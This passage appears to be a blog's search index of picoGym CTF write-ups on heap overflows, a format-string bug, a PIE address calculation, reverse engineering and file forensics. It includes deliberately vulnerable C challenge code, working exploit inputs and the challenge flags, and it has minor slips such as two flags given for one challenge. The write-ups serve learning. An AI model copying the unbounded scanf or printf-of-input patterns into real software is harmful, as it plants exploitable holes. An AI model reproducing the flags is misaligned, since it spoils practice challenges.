[
  
  {
    "title": "picoGym Binary Exploitation - Medium writeups",
    "url": "/posts/picogym_binx_medium_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, binary-exploitation",
    "date": "2025-05-30 11:00:00 +0530",
    





    
    "snippet": "picoCTFtitle: picoGym Binary Exploitation - Easy writeupsdate: 2025-05-24 11:00:00 +0530categories: [CTF, PicoCTF]tags: [ctf, writeups, cybersecurity, binary-exploitation]     # TAG names should al...",
    "content": "picoCTFtitle: picoGym Binary Exploitation - Easy writeupsdate: 2025-05-24 11:00:00 +0530categories: [CTF, PicoCTF]tags: [ctf, writeups, cybersecurity, binary-exploitation]     # TAG names should always be lowercasedescription: This post consists of writeups of the challenges CYB3R_BO1 had solved in PicoCTF practice.—picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceHeapheap 1We are given with two files - chall and chall.c and a netcat command. chall is a binary and chall.c contains the source code and the netcat command is used to interact with the binary in remote server.This is the source code for chall.c:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define FLAGSIZE_MAX 64// amount of memory allocated for input_data#define INPUT_DATA_SIZE 5// amount of memory allocated for safe_var#define SAFE_VAR_SIZE 5int num_allocs;char *safe_var;char *input_data;void check_win() {    if (!strcmp(safe_var, \"pico\")) {        printf(\"\\nYOU WIN\\n\");        // Print flag        char buf[FLAGSIZE_MAX];        FILE *fd = fopen(\"flag.txt\", \"r\");        fgets(buf, FLAGSIZE_MAX, fd);        printf(\"%s\\n\", buf);        fflush(stdout);        exit(0);    } else {        printf(\"Looks like everything is still secure!\\n\");        printf(\"\\nNo flage for you :(\\n\");        fflush(stdout);    }}void print_menu() {    printf(\"\\n1. Print Heap:\\t\\t(print the current state of the heap)\"           \"\\n2. Write to buffer:\\t(write to your own personal block of data \"           \"on the heap)\"           \"\\n3. Print safe_var:\\t(I'll even let you look at my variable on \"           \"the heap, \"           \"I'm confident it can't be modified)\"           \"\\n4. Print Flag:\\t\\t(Try to print the flag, good luck)\"           \"\\n5. Exit\\n\\nEnter your choice: \");    fflush(stdout);}void init() {    printf(\"\\nWelcome to heap1!\\n\");    printf(        \"I put my data on the heap so it should be safe from any tampering.\\n\");    printf(\"Since my data isn't on the stack I'll even let you write whatever \"           \"info you want to the heap, I already took care of using malloc for \"           \"you.\\n\\n\");    fflush(stdout);    input_data = malloc(INPUT_DATA_SIZE);    strncpy(input_data, \"pico\", INPUT_DATA_SIZE);    safe_var = malloc(SAFE_VAR_SIZE);    strncpy(safe_var, \"bico\", SAFE_VAR_SIZE);}void write_buffer() {    printf(\"Data for buffer: \");    fflush(stdout);    scanf(\"%s\", input_data);}void print_heap() {    printf(\"Heap State:\\n\");    printf(\"+-------------+----------------+\\n\");    printf(\"[*] Address   -&gt;   Heap Data   \\n\");    printf(\"+-------------+----------------+\\n\");    printf(\"[*]   %p  -&gt;   %s\\n\", input_data, input_data);    printf(\"+-------------+----------------+\\n\");    printf(\"[*]   %p  -&gt;   %s\\n\", safe_var, safe_var);    printf(\"+-------------+----------------+\\n\");    fflush(stdout);}int main(void) {    // Setup    init();    print_heap();    int choice;    while (1) {        print_menu();\tif (scanf(\"%d\", &amp;choice) != 1) exit(0);        switch (choice) {        case 1:            // print heap            print_heap();            break;        case 2:            write_buffer();            break;        case 3:            // print safe_var            printf(\"\\n\\nTake a look at my variable: safe_var = %s\\n\\n\",                   safe_var);            fflush(stdout);            break;        case 4:            // Check for win condition            check_win();            break;        case 5:            // exit            return 0;        default:            printf(\"Invalid choice\\n\");            fflush(stdout);        }    }}So after running the binary, we will be given a heap with two variables with addresses, and checking the check_win() function, we will be able to get the flag if the change the value of safe_var to “pico”.This is a classic heap exploitation challenge. Let’s see what address we got,We got the addresses - 0x5a551c09f2b0 and 0x5a551c09f2d0, theri difference is 0x20 (which is 32 in decimal), so we directly can’t print flag using menu-4 unless we change the safe_var.Now for the exploitation step, to change the value of safe_var to “pico”, we need to input some 32_characters+”pico” to menu-2, this will rewrite the safe_var.I gave an input: ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFpico, which is 26_alphabets+6_alphabets+pico, using this we are able to successfully exploit the binary or heap.I got the Flag!Flag: picoCTF{starting_to_get_the_hang_21306688}Flag: picoCTF{and_down_the_road_we_go_dde41590}"
  },
  
  {
    "title": "picoGym Reverse Engineering - Easy writeups",
    "url": "/posts/picogym_rev_easy_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, reverse-engineering",
    "date": "2025-05-24 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceEasyvault-door-trainingExplanation:So they have given us a java file - VaultDoorTraining.java with source code:import java.util.*;class VaultDoorTraining {    public static void main(String args[]) {        VaultDoorTraining vaultDoor = new VaultDoorTraining();        Scanner scanner = new Scanner(System.in);         System.out.print(\"Enter vault password: \");        String userInput = scanner.next();\tString input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);\tif (vaultDoor.checkPassword(input)) {\t    System.out.println(\"Access granted.\");\t} else {\t    System.out.println(\"Access denied!\");\t}   }    // The password is below. Is it safe to put the password in the source code?    // What if somebody stole our source code? Then they would know what our    // password is. Hmm... I will think of some ways to improve the security    // on the other doors.    //    // -Minion #9567    public boolean checkPassword(String password) {        return password.equals(\"w4rm1ng_Up_w1tH_jAv4_eec0716b713\");    }}From the given source code we can understand the working mechansim. The main function is called, then Prints the string “Enter the vault password”, then asks for input from the user. After taking the input, it slices the input to collect a substring. Checks if the substring is valid or not using the checkPassword method. From the source code we can get the flag. To check if it is valid or not, use the below command to run the java file.javac VaultDoorTraining.javajava VaultDoorTrainingWhen prompted for password, enter the complete string, which is - picoCTf{ + w4rm1ng_Up_w1tH_jAv4_eec0716b713 + }, the access will be grantedI got the flag!Flag: picoCTF{w4rm1ng_Up_w1tH_jAv4_eec0716b713}###"
  },
  
  {
    "title": "picoGym Binary Exploitation - Easy writeups",
    "url": "/posts/picogym_binx_easy_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, binary-exploitation",
    "date": "2025-05-24 11:00:00 +0530",
    





    
    "snippet": "picoCTFtitle: picoGym Binary Exploitation - Easy writeupsdate: 2025-05-24 11:00:00 +0530categories: [CTF, PicoCTF]tags: [ctf, writeups, cybersecurity, binary-exploitation]     # TAG names should al...",
    "content": "picoCTFtitle: picoGym Binary Exploitation - Easy writeupsdate: 2025-05-24 11:00:00 +0530categories: [CTF, PicoCTF]tags: [ctf, writeups, cybersecurity, binary-exploitation]     # TAG names should always be lowercasedescription: This post consists of writeups of the challenges CYB3R_BO1 had solved in PicoCTF practice.—picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceEasyheap 0Explanation:We are given two files - one is the source code written in C - chall.c and other is the compiled source code binary - chall and a netcat command to connect with the server.This is the source code:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define FLAGSIZE_MAX 64// amount of memory allocated for input_data#define INPUT_DATA_SIZE 5// amount of memory allocated for safe_var#define SAFE_VAR_SIZE 5int num_allocs;char *safe_var;char *input_data;void check_win() {    if (strcmp(safe_var, \"bico\") != 0) {        printf(\"\\nYOU WIN\\n\");        // Print flag        char buf[FLAGSIZE_MAX];        FILE *fd = fopen(\"flag.txt\", \"r\");        fgets(buf, FLAGSIZE_MAX, fd);        printf(\"%s\\n\", buf);        fflush(stdout);        exit(0);    } else {        printf(\"Looks like everything is still secure!\\n\");        printf(\"\\nNo flage for you :(\\n\");        fflush(stdout);    }}void print_menu() {    printf(\"\\n1. Print Heap:\\t\\t(print the current state of the heap)\"           \"\\n2. Write to buffer:\\t(write to your own personal block of data \"           \"on the heap)\"           \"\\n3. Print safe_var:\\t(I'll even let you look at my variable on \"           \"the heap, \"           \"I'm confident it can't be modified)\"           \"\\n4. Print Flag:\\t\\t(Try to print the flag, good luck)\"           \"\\n5. Exit\\n\\nEnter your choice: \");    fflush(stdout);}void init() {    printf(\"\\nWelcome to heap0!\\n\");    printf(        \"I put my data on the heap so it should be safe from any tampering.\\n\");    printf(\"Since my data isn't on the stack I'll even let you write whatever \"           \"info you want to the heap, I already took care of using malloc for \"           \"you.\\n\\n\");    fflush(stdout);    input_data = malloc(INPUT_DATA_SIZE);    strncpy(input_data, \"pico\", INPUT_DATA_SIZE);    safe_var = malloc(SAFE_VAR_SIZE);    strncpy(safe_var, \"bico\", SAFE_VAR_SIZE);}void write_buffer() {    printf(\"Data for buffer: \");    fflush(stdout);    scanf(\"%s\", input_data);}void print_heap() {    printf(\"Heap State:\\n\");    printf(\"+-------------+----------------+\\n\");    printf(\"[*] Address   -&gt;   Heap Data   \\n\");    printf(\"+-------------+----------------+\\n\");    printf(\"[*]   %p  -&gt;   %s\\n\", input_data, input_data);    printf(\"+-------------+----------------+\\n\");    printf(\"[*]   %p  -&gt;   %s\\n\", safe_var, safe_var);    printf(\"+-------------+----------------+\\n\");    fflush(stdout);}int main(void) {    // Setup    init();    print_heap();    int choice;    while (1) {        print_menu();\tint rval = scanf(\"%d\", &amp;choice);\tif (rval == EOF){\t    exit(0);\t}        if (rval != 1) {            //printf(\"Invalid input. Please enter a valid choice.\\n\");            //fflush(stdout);            // Clear input buffer            //while (getchar() != '\\n');            //continue;\t    exit(0);        }        switch (choice) {        case 1:            // print heap            print_heap();            break;        case 2:            write_buffer();            break;        case 3:            // print safe_var            printf(\"\\n\\nTake a look at my variable: safe_var = %s\\n\\n\",                   safe_var);            fflush(stdout);            break;        case 4:            // Check for win condition            check_win();            break;        case 5:            // exit            return 0;        default:            printf(\"Invalid choice\\n\");            fflush(stdout);        }    }}After observing the source code and running the binary, it gives us a heap and some menu options - print heap, write buffer, print safe_var, print flag and exit.When we select the print flag menu, it prints “Looks like everthing is still secure. No flag for you”, so it must mean we have to make the binary insecure, and for that I think we need to change the safe_var.So the safe_var turns out to be “bico”.Lets try to write buffer, if we write something, it gets saved in the personal block of data of the heap.So it turns out anything we write will be only changed in the single location, we cannot change the value of safe_var using write to buffer (noramlly).So, to solve this challenge we have to use heap exploitation and by that if we were able to change the value of safe_var, we may get the flag. So to do that, we can use the addresses provided to us and use the concept of Heap Overflow.Looking at the address we were given - 0x55b09bf386b0 and 0x55b09bf386d0. When we look at the difference between them it is - 0x20 (32 in decimal), so if we input a string of length more than 32 characters, it will overflow the “pico” address and enter the “bico” address which is the safe_var. Hence we will be able to get the flag. So lets try to input Alphabets 2x times to see what happens.You can see the value of safe_var and the other address after heap overflow. The value of safe_var starts from 33rd character of string. Hence we got the flag.I got the flag!Flag: picoCTF{my_first_heap_overflow_749119de}format string 0Explanation:We were given two file, one with the source code written in C - format-string-0.c and other is the compiled binary of the source code - format-string-0 and a netcat command to connect with the server.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#define BUFSIZE 32#define FLAGSIZE 64char flag[FLAGSIZE];void sigsegv_handler(int sig) {    printf(\"\\n%s\\n\", flag);    fflush(stdout);    exit(1);}int on_menu(char *burger, char *menu[], int count) {    for (int i = 0; i &lt; count; i++) {        if (strcmp(burger, menu[i]) == 0)            return 1;    }    return 0;}void serve_patrick();void serve_bob();int main(int argc, char **argv){    FILE *f = fopen(\"flag.txt\", \"r\");    if (f == NULL) {        printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\",                        \"own debugging flag.\\n\");        exit(0);    }    fgets(flag, FLAGSIZE, f);    signal(SIGSEGV, sigsegv_handler);    gid_t gid = getegid();    setresgid(gid, gid, gid);    serve_patrick();      return 0;}void serve_patrick() {    printf(\"%s %s\\n%s\\n%s %s\\n%s\",            \"Welcome to our newly-opened burger place Pico 'n Patty!\",            \"Can you help the picky customers find their favorite burger?\",            \"Here comes the first customer Patrick who wants a giant bite.\",            \"Please choose from the following burgers:\",            \"Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe\",            \"Enter your recommendation: \");    fflush(stdout);    char choice1[BUFSIZE];    scanf(\"%s\", choice1);    char *menu1[3] = {\"Breakf@st_Burger\", \"Gr%114d_Cheese\", \"Bac0n_D3luxe\"};    if (!on_menu(choice1, menu1, 3)) {        printf(\"%s\", \"There is no such burger yet!\\n\");        fflush(stdout);    } else {        int count = printf(choice1);        if (count &gt; 2 * BUFSIZE) {            serve_bob();        } else {            printf(\"%s\\n%s\\n\",                    \"Patrick is still hungry!\",                    \"Try to serve him something of larger size!\");            fflush(stdout);        }    }}void serve_bob() {    printf(\"\\n%s %s\\n%s %s\\n%s %s\\n%s\",            \"Good job! Patrick is happy!\",            \"Now can you serve the second customer?\",            \"Sponge Bob wants something outrageous that would break the shop\",            \"(better be served quick before the shop owner kicks you out!)\",            \"Please choose from the following burgers:\",            \"Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak\",            \"Enter your recommendation: \");    fflush(stdout);    char choice2[BUFSIZE];    scanf(\"%s\", choice2);    char *menu2[3] = {\"Pe%to_Portobello\", \"$outhwest_Burger\", \"Cla%sic_Che%s%steak\"};    if (!on_menu(choice2, menu2, 3)) {        printf(\"%s\", \"There is no such burger yet!\\n\");        fflush(stdout);    } else {        printf(choice2);        fflush(stdout);    }}After observing the source code and running the binary, it gives us a question and asks to enter the right answer.As this challenge is named format string we have to know the format specifiers in C to solve challenge.The binary asks for something big to eat (giant bite) for Patrick. We can’t just guess which is the big bite but if you look closely on the menu items, we got Gr%114d_Cheese, which is not normal. Look at the below sorce code.#include &lt;stdio.h&gt;int main(){    printf(\"Gr%114d_Cheese\");    return 0;}Gr                                                                                                        1790626872_CheeseSo what happened is, %144d is a format sepcifier used for generating 144 spaces and prints an integer mentioned at the end. example: printf(“%144d”, 42) prints 144 spaces and ends with 42. Here we didn’t mention any number so it printed a garbage value after 144 spaces. So this menu item should be big enough for Patrick.Hence we solved the first one and now we got to enter another menu item of a set of different menu items - Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak. It says Spongebob wants something outrageous that would break the shop (which is something that is unacceptable). If we look carefully, we can find a menu item Cla%sic_Che%s%steak, this print some gibberish characters.#include &lt;stdio.h&gt;int main(){    printf(\"Cla%sic_Che%s%steak\");    return 0;}Cla�Q�S�ic_Che�Q�S��0UL�UteakSo this must be the item. After entering we will get the flag.I got the flagFlag: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}PIE TIMEWe are given two files - one is the source code written in C - vuln.c and other is the compiled binary of the source code - vuln and a netcat command to connect with the server.Here the source code of the C program:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;void segfault_handler() {  printf(\"Segfault Occurred, incorrect address.\\n\");  exit(0);}int win() {  FILE *fptr;  char c;  printf(\"You won!\\n\");  // Open file  fptr = fopen(\"flag.txt\", \"r\");  if (fptr == NULL)  {      printf(\"Cannot open file.\\n\");      exit(0);  }  // Read contents from file  c = fgetc(fptr);  while (c != EOF)  {      printf (\"%c\", c);      c = fgetc(fptr);  }  printf(\"\\n\");  fclose(fptr);}int main() {  signal(SIGSEGV, segfault_handler);  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered  printf(\"Address of main: %p\\n\", &amp;main);  unsigned long val;  printf(\"Enter the address to jump to, ex =&gt; 0x12345: \");  scanf(\"%lx\", &amp;val);  printf(\"Your input: %lx\\n\", val);  void (*foo)(void) = (void (*)())val;  foo();}Let’s take a look at the source code. We can find functions like main() and win(), and the win() function prints the flag. Now let’s run the bianry.So we are given with the main() address and it is asking for an address to jump, well if we enter the address of the win() function, we will be able to get the flag.So let’s find the address of the functions using gdb.$ gdb ./vuln(gdb) info functionsThis will return the result:If we take a close look, we can find the address of win() function which is - 0x12a7l, but the thing is we can also find the main() function address - 0x133d which is different from earlier. So that must mean if we were able to find the difference and corresponding to the new main() address, we can find the new win() address.So the difference between main() and win() is 0x96 (150 in decimal). Now lets run the netcat command provided.we are given with a random main() address - 0x57ed8b2ed33d, which is some big number. Now subtracting (hexadecimal subtraction) 0x96 from the given address, we will get win() address which for me is - 0x57ED8B2ED2A7 which when enters gives the flag.I got the flag!Flag: picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_3d38fb4b}"
  },
  
  {
    "title": "picoGym Forensics-Medium writeups",
    "url": "/posts/picogym_forensics_medium_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, forensics, steganography",
    "date": "2025-05-09 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practicePacket AnalysisFindAndOpenExplanation:We are given - flag.zip and dump.pcap, the flag.zip is locked with a password and we need to find the password from the pcap.After analysing dump.pcap, it looks like MDNS protocol logs are useless, hence when sorted the time in ascending order, we can file few useful and meaningful strings in the data of each log like - “Flying on Ethernet secret: Is this the flag?”, “Could the flag have been splitted”, as I keep on checking the logs, I found a base64 string in one log and after decoding it we get,This is the secret: picoCTF{R34DING_LOKd_So we got the secret, now when we unzip the flag.zip using the secret, we will get a file - flag, which turns out to be a ASCII text. When check the contents, we can see the flag.I got the flag!Flag: picoCTF{R34DING_LOKd_fil56_succ3ss_0f2afb1a}Steganographyflags are stepicExplanation:After launching the instance, you will be given a url which directs you to a webpage with contries and their flags. When I looking into the webpage source code, I couldn’t find anything suspective then I came across a country - “Upanzi, Republic The” which is a fake (even it’s name isn’t complete). So it turns out of all the countries this one is fake, I looked at the source code, robots.txt, sitemap.xml but no progress, so I thought it has something to do with the country flag. So I saved the image - upz.png, which is supposed to be the country flag of the fake country.Now after getting the image, I tried various commands like strings, exiftool, binwalk, zsteg etc., but didn’t get anything. After looking at the challenge clearly, I came to suspect the word “stepic”, looked it up over the internet. I found something interesting.It turns out stepic is a python module used for steganography, and after installing it and reading its manual, I came to understand how to use it. Below is the command I used to extract the flag from the imagestepic -i upz.png -dThis command returns the flag, here -i is for reading image and -d is for decoding the image.I got the flag!Flag: picoCTF{fl4g_h45_fl4g57f48d94}hidemeExplanation:We are given a image - flag.png, when opened couldn’t find anything related to the flag. But after using binwalk I saw something hidden in the image, so I used the below command to extract the contents of the image.binwalk -e flag.pngThis extracted a folder from the image, then I went to folder to find another image at - _flag.png.extracted/secret, to find a image - flag.png, when opened would give us the flag.I got the flag!Flag: picoCTF{Hiddinng_An_imag3_within_@n_ima9e_ad9f6587}St3g0Explanation:We are given a file names - pico.flag.png, it is a legit png file as the file command confirms it. Checking the exif data there isn’t anything sus.As the challenge name suggests, this must be a steganography challenge. As the file type is png I tried using zsteg and got this outputWe can see the flag in the plain sight. NOTE: The flag starts at - p and ends at - }, as the flag format suggests.I got the flag!Flag: picoCTF{7h3r3_15_n0_5p00n_a9a181eb}Lookey hereExplanation:So we are given a txt file - anthem.flag.txt, when I used file command and checked the exif data I couldn’t find anything sus, until I used cat command. It turns out as a long…long…long text files with nearly 2000 lines.So I tried grep on the file to filter out the flag and it worked, the below can be used for the process.cat anthem.flag.txt | grep \"picoCTF\"I got the flag!Flag: picoCTF{gr3p_15_@w3s0m3_2116b979}So MetaExplanation:We are given a png file - pico_img.png, as the challenge name suggests, the flag must be in the metadata. So I used exiftool to view the metadata.exiftool pico_img.pngWe can see the flag stored as the value of - artist in the metadata.I got the flag!Flag: picoCTF{s0_m3ta_eb36bf44}What Lies WithinExplanation:We are given a png file - buildings.png, it is a legit png file, confirmed with file command. Exiftool and binwalk didn’t give anything interesting.As I read the description the challenge must be related to extracting something from the image, so I thought as the image is png, we can use zsteg. After using zsteg on the image, I found the flag in the output generated by zsteg.zsteg buildings.png I got the flag!Flag: picoCTF{h1d1ng_1n_th3_b1t5}OSINT (Open Source Intelligence)Memory ForensicsDisk / File System ForensicsLog AnalysisMobile ForensicsDocument ForensicsRedaction gone wrongExplanation:We are given a pdf file with some text got hidden. This challenge can be solved in two ways.One: Open the pdf use Ctrl+A to select all, you can see the flag.Two: Using the command pdftotext, use it on the pdf and filter out the flag from the generated text file. The below commands can be used to do the process.pdftotext Financial_Report_for_ABC_Labs.pdfstrings Financial_Report_for_ABC_Labs.pdf | grep \"picoCTF\"Flag: picoCTF{C4n_Y0u_S33_m3_fully}Audio/Video ForensicsextensionsExplanation:We are given a file - flag.txt, as this challenge name is extension, I tried checking if the .txt extension is valid for the file. I used - file command and it returned - flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlacedSo the file’s real extension must be .png, so I changed the extension using - move command.mv flag.txt flag.pngI opened the .png to see if I got anything.I got the flag!Flag: picoCTF{now_you_know_about_extensions}WhitePagesExplanation:We are given with a text file - whitepages.txt. When I used text editor to open the file, I couldn’t find any characters inside it except space.When used file command, it returned - Unicode text, UTF-8 text, with very long lines (1376), with no line terminators. So I checked the hex representation and found this:00000000: e280 83e2 8083 e280 83e2 8083 20e2 8083  ............ ...00000010: 20e2 8083 e280 83e2 8083 e280 83e2 8083   ...............00000020: 20e2 8083 e280 8320 e280 83e2 8083 e280   ...... ........00000030: 83e2 8083 20e2 8083 e280 8320 e280 8320  .... ...... ... 00000040: 2020 e280 83e2 8083 e280 83e2 8083 e280    ..............00000050: 8320 20e2 8083 20e2 8083 e280 8320 e280  .  ... ...... ..If we oberserve carefully we can see it only consists of two unique sequences - e2 80 83 and 20. According to the UTF-8 chart and ASCII chart, e2 80 83 is the hex representation of Em Space and 20 is the representation of Space. Maybe we replace unicode hex with 0 and ascii with 1 we may find the flag, so I wrote the below python program.def convertSpacesToBinary():    with open('whitepages.txt', 'rb') as f:        result = f.read()    result = result.replace(b'\\xe2\\x80\\x83', b'0')  # Unicode EM SPACE -&gt; 0    result = result.replace(b'\\x20', b'1')  # ASCII Space -&gt; 1    result = result.decode()    return resultdef convertFromBinaryToASCII(binaryValues):    binary_int = int(binaryValues, 2)    byte_number = (binary_int.bit_length() + 7) // 8    binary_array = binary_int.to_bytes(byte_number, \"big\")    ascii_text = binary_array.decode('ascii')    print(ascii_text)convertFromBinaryToASCII(convertSpacesToBinary())Let’s try running it.I got the Flag!Flag: picoCTF{not_all_spaces_are_created_equal_c54f27cd05c2189f8147cc6f5deb2e56}like1000Explanation:We are given a .tar file - 1000.tar. I extracted the contents of the .tar file using the below command.tar -xvf 1000.tarIt returned two files - 999.tar and filler.txt. The contents of filler.txt is - alkfdslkjf;lkjfdsa;lkjfdsa. So it looks like the tar consists of tar files and a text file with some random text. That must mean we have to extract it’s contents till 1.tar, and 1.tar must be containing something important. We can’t extract the .tar files 1000 times manually, I mean it’s tough and time-taking, hence I written a shell script to automate the process.#!/bin/bashn=1000while [ $n -ge 1 ]; do  TAR_FILE=\"${n}.tar\"  if [[ -f \"$TAR_FILE\" ]]; then    echo \"Extracting $TAR_FILE...\"    tar -xf \"$TAR_FILE\"    rm -f filler.txt  else    echo \"Warning: $TAR_FILE does not exist.\"  fi  ((n--))doneHere’s the explanation of above shell script, initiated a variable n with value 1000, and in the while loop used TAR_FILE to store the name of the tar, in the first iteration it is 1000.tar, if condition checks if the file is present then executes the extraction of the tar, as every time a new filler.txt is going to be generated to avoid any kind of problem, the shell script removes it, then n value becomes 999 and next loop starts with file name 999.tar.After the whole extraction process, we will get a flag.png which when opened we can see the flag.I got the Flag!Flag: picoCTF{l0t5_0f_TAR5}MacroHard WeakEdgeExplanation:We are given a .pptm file named - Forensics is fun.pptm, which is a -  Microsoft PowerPoint 2007+.I tried opening it with Microsoft Powerpoint, it looks like it is corrupted or something. But even after opening it, I couldn’t find anything helpful. When used exiftool it gave me a bunch of data and from that I hypothesised there is something hidden, like compressed. So the used the below command to extract the data.binwalk -e Forensics\\ is\\ Fun.pptmThis returned so much data so I have to view it using tree command.cd _Forensics\\ is\\ Fun.pptm.extractedtreeI found some useful files that may contain a flag - docprops/thumbnail.jpeg, ppt/slideMasters/hidden, ppt/vbaProject.bin. I started with hidden. After printing it’s contents I got a string with spaces between characters, I removed the spaces and it looked like a base64 string. So I decoded it.echo \"ZmxhZzogcGljb0NURntEMWRfdV9rbjB3X3BwdHNfcl96MXA1fQ\" | base64 -dThis will return the flag, If I have worked on Image Forensics of thumbnail.jpeg or binary analysis of vbaProject.bin it might have taken more time to solve this challenge as they do not contain the flag.I got the Flag!Flag: picoCTF{D1d_u_kn0w_ppts_r_z1p5}advanced-potion-makingExplanation:We are given a file named - advanced-potion-making, which when used file command command returned “data”, I tried exiftool and binwalk but they didn’t help. I tried checking the hex data using - xxd, then I found something interesting, The file header is an invalid file signature (source), and the closest file signatures it resembles is PNG, hence I changed the file header using a header. This is the final file header:89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52After changing the file header and opening it, all I see is red color. So I used this tool, applied black and white filter on the image, then I am able to see the flag.I got the flag!Flag: picoCTF{w1z4rdry}File typesExplanation:We are given a file named - Flag.pdf, when I used file command on it, it returned - Flag.pdf: shell archive text. Hence I changed the file name to Flag.pdf to Flag.sh.After viewing the contents, I gave permissions and ran the shell script.chmod +x Flag.shsh Flag.shIt created a file named flag, when used file command returned - flag: current ar archive. I used to below command to etract the contents.ar x flagThis extracted and overwrote the flag, hence when used file commnad it returned - flag: cpio archive. I used the below command to extract its contents.cpio -idu &lt; flagThis extracted and overwrote the flag, hence when used file commnad it returned - flag: bzip2 compressed data. I used the below command to extract its contents.bzip2 -d flagThis extracted and created a file named - flag.out, hence when used file commnad it returned - flag.out: gzip compressed data. I used the below commands to extract its contents.mv flag.out flag.gzgzip -d flag.gzThis extracted and created a file named - flag, hence when used file commnad it returned - flag: lzip compressed data. I used the below command to extract its contents.lzip -d flagnote: There is a chance of lzip not being installed, so install it using - sudo apt install lzip.This extracted and created a file named - flag.out, hence when used file commnad it returned - flag.out: LZ4 compressed data. I used the below commands to extract its contents.mv flag.out flag.lz4lz4 -d flag.lz4note: There is a chance of lzip not being installed, so install it using - sudo apt install lz4.This extracted and created a file named - flag, hence when used file commnad it returned - flag: LZMA compressed data. I used the below commands to extract its contents.mv flag flag.xz lzma -d flag.xzThis extracted and created a file named - flag, hence when used file commnad it returned - flag: lzop compressed data. I used the below commands to extract its contents.mv flag flag.lzolzop -d flag.lzoThis extracted and created a file named - flag, hence when used file commnad it returned - flag: lzip compressed data. I used the below command to extract its contents.lzip -d flagThis extracted and created a file named - flag.out, hence when used file commnad it returned - flag.out: XZ compressed data. I used the below commands to extract its contents.mv flag.out flag.xzxz -d flag.xzThis extracted and created a file named - flag, hence when used file commnad it returned - flag: ASCII text. These are the contents of the ASCII text:7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f6630725f3062326375723137795f33633739633562617d0aIt doesn’t look like baase64 encoded, so I thought maybe it’s related to ASCII, so using a ASCII Chart I found something, 70 &gt; p, 69 &gt; i, 